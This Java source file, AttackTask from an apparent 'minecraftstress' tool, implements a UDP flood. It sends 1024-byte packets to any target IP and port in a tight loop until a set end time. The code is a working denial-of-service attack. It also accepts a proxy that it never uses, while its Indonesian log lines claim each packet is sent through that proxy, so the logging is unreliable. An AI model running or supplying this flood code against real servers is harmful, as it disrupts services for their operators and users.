package com.josemarcellio.minecraftstress;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Proxy;
import java.util.logging.Level;
import java.util.logging.Logger;

public class AttackTask implements Runnable {

    private static final Logger LOGGER = Logger.getLogger(AttackTask.class.getName());

    private final Proxy proxy;
    private final String targetIp;
    private final int targetPort;
    private final long endTime;

    public AttackTask(Proxy proxy, String targetIp, int targetPort, long endTime) {
        this.proxy = proxy;
        this.targetIp = targetIp;
        this.targetPort = targetPort;
        this.endTime = endTime;
    }

    @Override
    public void run() {
        try (DatagramSocket datagramSocket = new DatagramSocket()) {
            byte[] buffer = new byte[1024];
            while (System.currentTimeMillis() < endTime) {
                try {
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length, InetAddress.getByName(targetIp), targetPort);
                    datagramSocket.send(packet);
                    LOGGER.info("Send packet ke " + targetIp + ":" + targetPort + " melalui proxy " + proxy.address());
                } catch (IOException e) {
                    LOGGER.log(Level.SEVERE, "Error ketika send packet: ", e);
                }
            }
        } catch (IOException e) {
            LOGGER.log(Level.SEVERE, "Proxy ERROR " + proxy.address() + ": ", e);
        }
    }
}
